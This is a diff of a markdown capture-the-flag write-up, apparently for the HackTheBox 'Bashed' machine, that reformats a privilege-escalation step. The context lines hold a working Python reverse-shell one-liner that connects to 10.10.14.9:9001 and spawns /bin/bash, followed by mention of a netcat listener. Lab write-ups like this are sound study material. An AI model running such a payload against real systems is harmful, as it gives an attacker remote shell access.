@@ -72,11 +72,11 @@ f.close
 
 -So we can insert the same py rev shell payload which we used earlier:
 
-scriptmanager@bashed:/scripts$ cat test.py
-cat test.py
+scriptmanager@bashed:/scripts$ cat test.py.  
+`cat test.py
 f = open('yes.py', 'w')
 f.write('import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.9",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")')
-f.close. 
+f.close`    
 
 Now, we setup a netcat listener on our machine to catch the reverse shell:  
 ![root](/assets/shell2.png)
